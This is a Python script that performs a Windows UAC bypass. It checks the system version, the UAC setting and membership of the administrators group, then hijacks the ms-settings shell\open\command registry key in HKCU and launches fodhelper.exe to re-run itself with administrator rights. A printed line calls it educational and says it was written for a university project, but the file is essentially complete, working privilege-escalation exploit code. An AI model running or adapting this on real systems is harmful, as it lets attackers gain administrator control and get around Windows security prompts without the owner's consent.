import subprocess
import ctypes
import os
import platform
OSNAME = 2
OSVERSION = 3
ARCHITECTURE = 14

windows_versions = ["7", "8", "2008", "2012", "10"]


def os_compatibile():
    print("don't use this uac bypass script, it's for education purpose only [wrote for crypto project USTHB Algeria], working with Windows (7|8|2008|2012|10)")
    print("getting system info ...")
    
    sysinfo_splited = subprocess.run('systeminfo',capture_output=True).stdout.split(b"\r\n")
    print(sysinfo_splited[OSNAME].decode(), 
        "\n"+sysinfo_splited[OSVERSION].decode(),
        "\n"+sysinfo_splited[ARCHITECTURE].decode())

    for version in windows_versions:
        if version in sysinfo_splited[OSNAME].decode() :
            print("windows version supported [ ", version," ]")
            return True
    return False


UAC_DEFAULT = "5"

def uac_status():
    print("checking for uac status ...")
    sysregister_splited = subprocess.run("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                                         capture_output=True).stdout.split(b"\r\n")
    if "0x1" in sysregister_splited[8].decode():
        print("uac is enabled.")
        print("checking for uac level ...")

        if UAC_DEFAULT in sysregister_splited[2].decode():
            print("uac is set to default.")
            return True
        else:
            print("error uac is not set to default")
            return False
    else:
        print("uac is not enabled")
        return False


ADMINISTRATORS_SID = 'S-1-5-32-544'
LOW_INTEGRITY_LEVEL_SID = 'S-1-16-4096'

def in_admin_grp_and_integrity_lvl():
    print("checking if user in administrators group ...")

    whoami = subprocess.run("whoami /groups",capture_output=True).stdout.decode()

    if ADMINISTRATORS_SID in whoami:
        print("user in administrators group.")
        print("checking for enough intergrity level ...")
        
        if LOW_INTEGRITY_LEVEL_SID not in whoami:
            print("user have enough integrity level")
            return True
        else:   
            print("error, user have low integrity level.")
            return False
    else:
        print("error, user not in administrators group.")
        return False
    
def exploit():
    windir = os.getenv('windir')
    fodhelper = windir+"\\System32\\fodhelper.exe"
    to_excute = windir+"\\System32\\cmd.exe /k "+os.path.abspath(__file__)
    
    subprocess.run("reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /f",
                   capture_output=False)
    subprocess.run('reg add hkcu\\Software\\Classes\\ms-settings\\shell\\open\\command /t REG_SZ /d "'+to_excute+'" /f',
                   capture_output=False)
    os.system(fodhelper)
    return True

def got_root():
    try:
        if os.getuid() == 0:
            return True
    except AttributeError:
        if ctypes.windll.shell32.IsUserAnAdmin() != 0 :
            return True
    
    return False
    
    
if not got_root():
    if os_compatibile():
        if uac_status():
            if in_admin_grp_and_integrity_lvl():
                exploit()
    else:
        print("error windows version is not supported")
else:
    print("NOURI Redouane : this script is running as administrator !")